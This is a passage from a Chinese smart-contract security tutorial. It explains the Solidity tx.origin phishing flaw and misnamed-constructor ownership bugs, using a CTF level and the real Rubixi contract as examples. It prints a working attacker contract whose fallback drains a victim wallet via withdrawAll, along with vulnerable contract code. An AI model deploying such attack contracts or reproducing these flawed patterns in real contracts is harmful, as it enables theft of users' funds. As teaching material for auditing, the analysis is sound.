    }
我们具体来看这个代码，这里存在一个转账函数，而转账是将`A用户中的余额转给_recipient对应的地址`。然而在转账前我们需要进行一个初始判断：`require(tx.origin
== owner)`，即我们合约的拥有者必须==`tx.origin`。
下面我们再来看攻击者合约：
    contract AttackContract { 
        Phishable phishableContract; 
        address attacker; // The attackers address to receive funds.
        constructor (Phishable _phishableContract, address _attackerAddress) { 
            phishableContract = _phishableContract; 
            attacker = _attackerAddress;
        }
        function () { 
            phishableContract.withdrawAll(attacker); 
        }
    }
在这个攻击合约中，我们看到它在构造函数中new了`Phishable`对象，  
然后传入了攻击者地址。之后又定义了`fallback`函数，而在函数中调用了`phishableContract`对象的`withdrawAll
()`函数。
之后我们来分析下攻击是如何产生的。
根据我们前面写过的文章，我们知道`fallback`函数会在转账的时候被默认调用，所以这个地方就存在了很多隐患。
我们假设一个场景，倘若攻击者通过各种方法（包括诈骗、诱导等）使用户A向攻击者进行一些转账操作，那么他就会默认的调用`phishableContract.withdrawAll(attacker);`函数。而对于此函数我们具体来看：
    function withdrawAll(address _recipient) public {
            require(tx.origin == owner);
            _recipient.transfer(this.balance); 
        }
在这个函数中，攻击者将_recipient参数赋值为自己的地址，也就为了用户能够将钱转给攻击者做准备。之后我们来看，倘若此时攻击者绕过了require的限制，那么ta就有可能把用户的钱全部转走。那么攻击者是否能绕过呢？答案是肯定的。
简单来说，此时 **User --调用-- >Attack的回调函数--调用-->User的withdraw函数**，而呈现出来的`tx.origin`是==合约创世人owner的。
我们做一个简单的实验：
合约内容
    pragma solidity ^0.4.18;
    contract UserWallet {
        address public owner;
        address public owner1;
        function setOwner() public returns(address){
        //   owner = msg.sender;
          return msg.sender;
       }
       function setOwner1() public returns(address){
        //   owner1 = tx.origin;
          return tx.origin;
       }
    }
    contract abc {
        UserWallet test = UserWallet(0x9dd1e8169e76a9226b07ab9f85cc20a5e1ed44dd);
        function a() public returns (address){
            return test.setOwner1();
        }
    }
    contract def {
        abc test = abc(0xdd1f635dfb144068f91d430c76f4219088af9e64);
        function b() public returns (address){
            return test.a();
        }
    }
首先在`0xca35b7d915458ef540ade6068dfe2f44e8fa733c`中部署  
之后，我们在`0x14723a09acff6d2a60dcdf7aa4aff308fddc160c`部署
最后我们在`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db`部署：
根据我们的代码，我们测试tx.orgin所代表的内容。
首先是合约`UserWallet`：
下面是合约`abc`：
然而我们这里最重要的函数是：合约`def`。
我们要通过合约`def`来远程调用abc：
对应这里为：
在部署合约`def`的地址下调用合约`abc`中的`b()`函数。
得到实际的地址为：
    地址详情
    1:0xca35b7d915458ef540ade6068dfe2f44e8fa733c
    2:0x14723a09acff6d2a60dcdf7aa4aff308fddc160c
    3:0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db
这样就绕过了用户函数中的`origin`条件，所以可以进行钓鱼：
倘若用户给调用合约转账，则调用了`fallback`函数。之后`User -> Attack -> User`。即意味着钓鱼合约把用户的钱取走了。
#### 2 构造函数安全分析
构造函数（Constructors）是特殊函数，在初始化合约时经常执行关键的权限任务。在 solidity v0.4.22
以前，构造函数被定义为与所在合约同名的函数。因此，如果合约名称在开发过程中发生变化，而构造函数名称没有更改，它将变成正常的可调用函数。
其实这种漏洞的原理并不复杂，但是带来的危害却是巨大的。
下面我们看一道ctf的题目：
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract Fallout is Ownable {
      mapping (address => uint) allocations;
      /* constructor */
      function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
      }
      function allocate() public payable {
        allocations[msg.sender] += msg.value;
      }
      function sendAllocation(address allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
      }
      function collectAllocations() public onlyOwner {
        msg.sender.transfer(this.balance);
      }
      function allocatorBalance(address allocator) public view returns (uint) {
        return allocations[allocator];
      }
    }
我们看到题目的要求如下：`Claim ownership of the contract below to complete this
level.`让我们成为合约的owner。而我们仔细的查看后发现合约中只有构造函数可以让自己成为owner。然而我们无法手动调用构造函数，所以题目就陷入了僵局。不过在我们仔细的查看后发现：
`Fallout`与构造函数`Fal1out`是不同的。即题目中给的函数并不是构造函数，只是看起来相似而已。
所以我们直接调用改函数即可更改合约`owner`。
在真实的环境中同样有这样的情况产生：
ubixi（[合约代码](https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code)）是另一个显现出这种漏洞的传销方案。合约中的构造函数一开始叫做
`DynamicPyramid` ，但合约名称在部署之前已改为 `Rubixi` 。构造函数的名字没有改变，因此任何用户都可以成为 `creator`
    contract Rubixi {
            //Declare variables for storage critical to contract
            uint private balance = 0;
            uint private collectedFees = 0;
            uint private feePercent = 10;
            uint private pyramidMultiplier = 300;
            uint private payoutOrder = 0;
            address private creator;
            //Sets creator
            function DynamicPyramid() {
                    creator = msg.sender;
            }
            modifier onlyowner {
                    if (msg.sender == creator) _
            }
            struct Participant {
                    address etherAddress;
                    uint payout;
            }
    ········
    }
### 四、参考资料
  * 
  * 
  * 
  * 
**本稿为原创稿件，转载请标明出处。谢谢。**